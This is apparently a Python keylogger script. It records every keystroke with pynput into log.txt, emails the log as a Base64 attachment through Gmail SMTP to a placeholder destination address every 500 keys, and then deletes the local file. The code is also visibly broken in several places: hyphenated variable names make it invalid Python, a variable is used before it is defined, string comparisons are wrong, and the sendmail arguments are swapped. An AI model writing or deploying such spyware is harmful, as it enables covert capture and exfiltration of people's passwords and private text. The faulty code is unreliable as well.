import getpass
import os
import pynput
import smtplib
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


# logger
count = 0
email_char_limit = 500
keys = []
key_count = 0
char_count = 0


def send_mail():
    email-password = [PASSWORD]
    email = [EMAIL]
    dest-email = [DEST-EMAIL]

    server = smtplib.SMTP('smtp.gmail.com', 25)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(email, email-password)

    msg = MIMEMultipart()
    msg['From'] = [NAME]
    msg['To'] = dest-email
    msg['Subject'] = [SUBJECT]

    message = [MESSAGE]

    msg.attach(MIMEText(message, 'plain'))

    filename = 'log.txt'
    attachment = open(filename, 'r')  # rb = bite mode

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f'attachment; filename={filename}')
    msg.attach(p)

    text = msg.as_string()
    server.sendmail(dest-email, email, text)
    server.quit()


def on_press(key):
    global keys, count, char_count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if key != Key.backspace:
        char_count += 1

    write_file(keys)
    keys = []

    if count == email_char_limit:
        send_mail()
        os.remove(filename)
        count = 0


def write_file(keys):
    global key_count, char_count
    with open(filename, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            Key.space
            key_count += 1
            if key_count == 80:
                f.write(' -\n')
                key_count = 0
            elif key == Key.backspace:
                char_count -= 1
                if char_count > 0:
                    f.seek(0, 2)
                    f.seek(f.tell() - 1, 0)
                    f.truncate()

            elif key == Key.space:
                f.write(' ')
            elif k.find("Key") == '#':
                f.write('#')
            elif k.find("Key") == 'ö':
                f.write('ö')
            elif k.find("Key") == 'ä':
                f.write('ä')
            elif k.find("Key") == 'ü':
                f.write('ü')
            elif k.find("Key") == 'Ö':
                f.write('Ö')
            elif k.find("Key") == 'Ä':
                f.write('Ä')
            elif k.find("Key") == 'Ü':
                f.write('Ü')
            elif k.find("Key") == '+':
                f.write('+')
            elif k.find("Key") == '-':
                f.write('-')
            elif k.find("Key") == '_':
                f.write('_')
            elif k.find("Key") == ':':
                f.write(':')
            elif k.find("Key") == ';':
                f.write(';')
            elif k.find("Key") == '~':
                f.write('~')
            elif k.find("Key") == '*':
                f.write('*')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.f5:
        os.remove(filename)
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

